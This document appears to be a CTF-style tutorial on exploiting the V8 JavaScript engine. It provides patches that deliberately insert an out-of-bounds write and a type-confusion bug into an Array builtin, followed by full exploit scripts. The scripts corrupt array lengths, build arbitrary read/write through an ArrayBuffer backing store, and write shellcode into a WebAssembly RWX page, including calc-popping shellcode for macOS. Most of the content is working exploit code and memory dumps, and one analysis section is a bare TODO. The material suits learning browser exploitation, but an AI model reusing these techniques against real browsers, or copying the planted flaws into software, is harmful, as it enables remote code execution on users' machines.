## Simple OOB Write

**Setting**

Google used `depot_tools` to deploy their own project.

So, you need to install that. Refer the below one :)

- https://commondatastorage.googleapis.com/chrome-infra-docs/flat/depot_tools/docs/html/depot_tools_tutorial.html#_setting_up

If you install `depot_tools` , you need to follow below command lines on your terminal.

```
fetch v8
cd v8
git checkout 46a2b441e843a1547502a33416de85e47796ee4d
git apply $(oob.patch file path)
gclient sync
./tools/dev/v8gen.py x64.release
ninja -C ./out.gn/x64.release
```



I made simple vunlerable code which based on `starCTF 2019 OOB`.

Apply this patch file :)

**patch file**

```diff
diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
index 40974769f7..4c66a29663 100644
--- a/src/builtins/builtins-array.cc
+++ b/src/builtins/builtins-array.cc
@@ -362,6 +362,31 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,
 }
 }  // namespace


+// Vulnerability is here
+// You can't use this vulnerability in Debug Build :)
+BUILTIN(ArrayAegis) {
+  uint32_t len = args.length();
+  if (len != 3) {
+    return ReadOnlyRoots(isolate).undefined_value();
+  }
+  Handle<JSReceiver> receiver;
+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+      isolate, receiver, Object::ToObject(isolate, args.receiver()));
+  Handle<JSArray> array = Handle<JSArray>::cast(receiver);
+  FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());
+
+  Handle<Object> value;
+  Handle<Object> length;
+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+      isolate, length, Object::ToNumber(isolate, args.at<Object>(1)));
+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+      isolate, value, Object::ToNumber(isolate, args.at<Object>(2)));
+
+  uint32_t r_length = static_cast<uint32_t>(length->Number());
+  elements.set(r_length, value->Number());
+  return ReadOnlyRoots(isolate).undefined_value();
+}
+
 BUILTIN(ArrayPush) {
   HandleScope scope(isolate);
   Handle<Object> receiver = args.receiver();
diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
index 53d1d5d349..5fc063112e 100644
--- a/src/builtins/builtins-definitions.h
+++ b/src/builtins/builtins-definitions.h
@@ -369,6 +369,7 @@ namespace internal {
   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \
   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \
   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \
+  CPP(ArrayAegis)                                                              \
                                                                                \
   /* ArrayBuffer */                                                            \
   /* ES #sec-arraybuffer-constructor */                                        \
diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
index 8878686027..e871c46264 100644
--- a/src/compiler/typer.cc
+++ b/src/compiler/typer.cc
@@ -1712,6 +1712,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
       return Type::Receiver();
     case Builtins::kArrayUnshift:
       return t->cache_->kPositiveSafeInteger;
+    case Builtins::kArrayAegis:
+      return Type::Receiver();


     // ArrayBuffer functions.
     case Builtins::kArrayBufferIsView:
diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc
index c8eab2122a..d1ee1b3b95 100644
--- a/src/init/bootstrapper.cc
+++ b/src/init/bootstrapper.cc
@@ -1664,6 +1664,8 @@ void Genesis::InitializeGlobal(Handle<JSGlobalObject> global_object,
                           false);
     SimpleInstallFunction(isolate_, proto, "copyWithin",
                           Builtins::kArrayPrototypeCopyWithin, 2, false);
+    SimpleInstallFunction(isolate_, proto, "aegis",
+                          Builtins::kArrayAegis, 2, false);
     SimpleInstallFunction(isolate_, proto, "fill",
                           Builtins::kArrayPrototypeFill, 1, false);
     SimpleInstallFunction(isolate_, proto, "find",
```



**Analysis**

I will not explain internal representation of V8 Objects, because very nice references are already publicly available :)

So, these tutorials focus on exploit techniques on V8 Engine.

Actually, this simple `array.prototype.aegis(...)` function can be exploited many ways.

I will corrupt array's length property by using this vulnerable function.



As you can see, `aegis` function takes 2 arguments.

First is index property and Second is value property.

There is no array boundary check, so you can easily out-of-bound write to your array object.



As array's elements and internal properties are located in same Heap, you can easily corrupt some array's length property.

Let's take a look at following code.

```javascript
// Unboxed double array
let victim = [1.1, 2.2, 3.3];
let leaked = [{}, {}, {}];
arr.aegis(6, 8.691694759794e-311)
```



Above code will modify victim's length property from 3 to 0x1000.



```
(lldbinit) x/40gx 0x2ba4b3c8b349-1-0x40
0x2ba4b3c8b308: 0x00002ba420318079 0x00002ba42031f701
0x2ba4b3c8b318: 0x00002ba469d004a9 [0x00002ba469d01481] <- victim's elements start location
0x2ba4b3c8b328: 0x0000000300000000 [0x3ff199999999999a] <- first index
0x2ba4b3c8b338: 0x400199999999999a 0x400a666666666666
0x2ba4b3c8b348: 0x00002ba479302fa1 0x00002ba469d00bf9
0x2ba4b3c8b358: 0x00002ba4b3c8b321 [0x0000000300000000] <- Length Property of victim :)
```



By modifying victim's length property, now we have complete out-of-bound R/W primitives.

To successfully read/write value from/to v8 engine, you need to set-up victim array as `unboxed double array`.

The term `unboxed` means raw value and `boxed` means wrapper object for raw value.



```
[Unboxed value]
0x2ba4b3c8b338: 0x400199999999999a 0x400a666666666666

[Boxed value]
0x155268e4b310: 0x00001552ab91f5d9 0x00001552ab91f5e9
(lldbinit) x/4gx 0x00001552ab91f5d9-1
0x1552ab91f5d8: 0x0000155279780539 0x3ff199999999999a
0x1552ab91f5e8: 0x0000155279780539 0x400199999999999a
```



By using unboxed double array, we can set directly arbitrary value to some victim object and directly read raw value from victim.



So, what value do we need to read and what value do we need to write?

On Desktop context, you need to read wasm assembly function object to find rwx page.

And you need to write arbitrary valid address for making arbitrary R/W primitives.



To make arbitrary R/W, we need to corrupt ArrayBuffer's backing_store.

At this phase, someone can ask like this, "Oh, why don't we use Array as Arbitrary R/W primitives?"

Because, ArrayBuffer's backing_store doesn't consider any property except for backing_store pointer itself.

But, in case of Array object, we need to consider element's map property and length property.



Yeah it's also possible to make arbitrary R/W via Array, but not efficient.

So, we corrupt ArrayBuffer's backing_store :)

Let's make code like this.



```javascript
let victim = [1.1, 2.2, 3.3];
let leaked = [wasm_f, wasm_f, wasm_f, wasm_f];
let ab = new ArrayBuffer(0x1000);
```



If we successfully corrupt victim's length property, we can leak `wasm_f` and we can set arbitrary address to `ab's backing_store` property.



And then, we need to traverse `wasm_f` 's object space to find rwx page.

If you find rwx page, just set shellcode to that page, and run wasm assembly function.



**Exploit code**

```javascript
function gc() { for (let i = 0; i < 0x10; i++) { new ArrayBuffer(0x1000000); } }


var f64 = new Float64Array(1);
var u32 = new Uint32Array(f64.buffer);


function d2u(v) {
  f64[0] = v;
  return u32;
}


function u2d(lo, hi) {
  u32[0] = lo;
  u32[1] = hi;
  return f64[0];
}


function hex(lo, hi) {
  if( lo == 0 ) {
    return ("0x" + hi.toString(16) + "-00000000");
  }
  if( hi == 0 ) {
    return ("0x" + lo.toString(16));
  }
  return ("0x" + hi.toString(16) + "-" + lo.toString(16));
}


let wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 7, 1, 96, 2, 127, 127, 1, 127, 3, 2, 1, 0, 4, 4, 1, 112, 0, 0, 5, 3, 1, 0, 1, 7, 21, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 8, 95, 90, 51, 97, 100, 100, 105, 105, 0, 0, 10, 9, 1, 7, 0, 32, 1, 32, 0, 106, 11]);
let wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), {});
let f = wasm_mod.exports._Z3addii;




function pwn () {


  let arr = [0x1234, 0x1338, 3.3];
  let leaked_array = [u2d(0xdada, 0xdada,), f, f, f];
  let ab = new ArrayBuffer(0x1338);


  arr.aegis(6, 0x1000);
  arr.aegis(8, 0x1000);


  for(let i = 0; i < 100; i++) {
    tmp = d2u(arr[i]);
    console.log(i + " : " + hex(tmp[0], tmp[1]));
  }


  // 28 -> wasm function addr
  let wasm_addr = d2u(arr[28]);


  // 37 -> arbitrary read/write
  arr[37] = u2d(wasm_addr[0] - 1, wasm_addr[1]);
  let dv = new DataView(ab);
  lo = dv.getUint32(0x18, true);
  hi = dv.getUint32(0x18 + 4, true);


  console.log(hex(lo, hi));
  arr[37] = u2d(lo - 1 - 0x120, hi);
  rwx_lo = dv.getUint32(0, true);
  rwx_hi = dv.getUint32(4, true);


  console.log(hex(rwx_lo, rwx_hi));


  arr[37] = u2d(rwx_lo, rwx_hi);
  for (let i = 0; i < 10; i++) {
    dv.setUint32(4 * i, 0xcccccccc, true);
  }


  f();
}


pwn();
```



 



## Simple Type Confusion

**patch file**

```diff
diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
index 40974769f7..e2679a6af7 100644
--- a/src/builtins/builtins-array.cc
+++ b/src/builtins/builtins-array.cc
@@ -362,6 +362,36 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,
 }
 }  // namespace

+// Vulnerability is here
+// You can't use this vulnerability in Debug Build :)
+BUILTIN(ArrayAegis) {
+  uint32_t len = args.length();
+  if (len != 3) {
+    return ReadOnlyRoots(isolate).undefined_value();
+  }
+  Handle<JSReceiver> receiver;
+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+      isolate, receiver, Object::ToObject(isolate, args.receiver()));
+  Handle<JSArray> array = Handle<JSArray>::cast(receiver);
+  FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());
+
+  Handle<Object> value;
+  Handle<Object> length;
+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+      isolate, length, Object::ToNumber(isolate, args.at<Object>(1)));
+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+      isolate, value, Object::ToNumber(isolate, args.at<Object>(2)));
+
+  uint32_t array_length = static_cast<uint32_t>(array->length().Number());
+  uint32_t r_length = static_cast<uint32_t>(length->Number());
+  if (r_length < array_length) {
+    elements.set(r_length, value->Number());
+    return ReadOnlyRoots(isolate).undefined_value();
+  } else {
+    return ReadOnlyRoots(isolate).undefined_value();
+  }
+}
+
 BUILTIN(ArrayPush) {
   HandleScope scope(isolate);
   Handle<Object> receiver = args.receiver();
diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
index 53d1d5d349..5fc063112e 100644
--- a/src/builtins/builtins-definitions.h
+++ b/src/builtins/builtins-definitions.h
@@ -369,6 +369,7 @@ namespace internal {
   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \
   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \
   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \
+  CPP(ArrayAegis)                                                              \
                                                                                \
   /* ArrayBuffer */                                                            \
   /* ES #sec-arraybuffer-constructor */                                        \
diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
index 8878686027..e871c46264 100644
--- a/src/compiler/typer.cc
+++ b/src/compiler/typer.cc
@@ -1712,6 +1712,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
       return Type::Receiver();
     case Builtins::kArrayUnshift:
       return t->cache_->kPositiveSafeInteger;
+    case Builtins::kArrayAegis:
+      return Type::Receiver();


     // ArrayBuffer functions.
     case Builtins::kArrayBufferIsView:
diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc
index c8eab2122a..d1ee1b3b95 100644
--- a/src/init/bootstrapper.cc
+++ b/src/init/bootstrapper.cc
@@ -1664,6 +1664,8 @@ void Genesis::InitializeGlobal(Handle<JSGlobalObject> global_object,
                           false);
     SimpleInstallFunction(isolate_, proto, "copyWithin",
                           Builtins::kArrayPrototypeCopyWithin, 2, false);
+    SimpleInstallFunction(isolate_, proto, "aegis",
+                          Builtins::kArrayAegis, 2, false);
     SimpleInstallFunction(isolate_, proto, "fill",
                           Builtins::kArrayPrototypeFill, 1, false);
     SimpleInstallFunction(isolate_, proto, "find",
```



**Analysis**

[TODO]



**Exploit code**



```javascript
let base = new ArrayBuffer(8);
let f64 = new Float64Array(base);
let u32 = new Uint32Array(base);

function d2u(v) {
  f64[0] = v;
  return u32;
}

function u2d(lo, hi) {
  u32[0] = lo;
  u32[1] = hi;
  return f64[0];
}

function hex(lo, hi) {
    if( lo == 0 ) {
        return ("0x" + hi.toString(16) + "-00000000");
    }
    if( hi == 0 ) {
        return ("0x" + lo.toString(16));
    }
    return ("0x" + hi.toString(16) + "-" + lo.toString(16));
}

// pop calc on macOS
let shellcode = [0x90909090, 0x90909090, 3343384682, 1885417159, 3209189232, 1819632492, 1919906913, 1958692951, 1936617321, 1465991983, 1093648200, 1768714352, 1213686115, 6499775, 1852141679, 3209189152, 1852400175, 6845231, 3867756631, 2303197290, 3330492663, 2303219211, 3330492670, 2303219208, 2303219454, 3526445286, 2965385544, 3368110082, 255569960, 2425393157, 2425393296, 2425393296, 0x90909090, 0xcccccccc];

let wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 7, 1, 96, 2, 127, 127, 1, 127, 3, 2, 1, 0, 4, 4, 1, 112, 0, 0, 5, 3, 1, 0, 1, 7, 21, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 8, 95, 90, 51, 97, 100, 100, 105, 105, 0, 0, 10, 9, 1, 7, 0, 32, 1, 32, 0, 106, 11]);
let wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), {});
let f = wasm_mod.exports._Z3addii;

let storage = [];

// Packed Double Array -> Fixed Array
// Fast Path
let arr = [1.1, 2.2, 3.3];

// Converted from Fixed Array to Dictionary mode
// Slow Path
arr[0x8000] = 1.1;

storage.push([1.1, 2.2, 3.3, 4.4]);
storage.push([u2d(0xcafebabe, 0xcafebabe), f]);
let ab = new ArrayBuffer(0x3232);

// "arr" is dictionary mode.
// But, "aegis" function uses the "arr" as Fixed Array
// So, Array mode "Type Confusion" occur.
// We can bypass length check routine.
arr.aegis(0x1f + 6, u2d(0, 0x4141));

let victim = storage[0];

for (let i = 0; i < 0x40; i++) {
  tmp = d2u(victim[i]);
  console.log(i + " : " + hex(tmp[0], tmp[1]));
}

let wasm_addr = d2u(victim[44]);

let dv = new DataView(ab);
victim[51] = u2d(wasm_addr[0] - 1, wasm_addr[1]);
lo = dv.getUint32(0x18, true);
hi = dv.getUint32(0x18 + 4, true);

console.log(hex(wasm_addr[0], wasm_addr[1]));
console.log(hex(lo, hi));

victim[51] = u2d(lo - 1 - 288, hi);
rwx_lo = dv.getUint32(0, true);
rwx_hi = dv.getUint32(4, true);

console.log(hex(rwx_lo, rwx_hi));

victim[51] = u2d(rwx_lo, rwx_hi);

for (let i = 0; i < shellcode.length; i++) {
  dv.setUint32(4 * i, shellcode[i], true);
}

console.log(u2d(0, 0x1000));

f();

```





